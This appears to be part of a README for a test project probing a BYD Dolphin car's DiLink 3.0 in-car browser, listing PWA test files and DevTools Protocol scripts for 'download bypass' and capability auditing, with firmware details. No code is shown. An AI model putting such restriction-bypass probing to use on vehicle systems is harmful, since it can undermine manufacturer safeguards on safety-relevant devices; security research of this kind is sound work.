- `pwa.html` — PWA install test page
- `manifest.json` — PWA manifest
- `sw.js` — service worker for cache API and PWA
- `serve_https.py` — HTTPS server with self-signed cert
- `cdp_download_test.py` — CDP download bypass test (6 methods)
- `cdp_download_test2.py` — focused CDP download test (5 methods + event capture)
- `cdp_capability_audit.py` — full CDP capability audit
- `test-download.bin` — 10KB test binary for download testing

## Tested On

- BYD Dolphin 2025
- DiLink 3.0, Android 10 (API 29)
- Firmware 13.1.32.2507250.1
- Country code: 55 (Brazil)
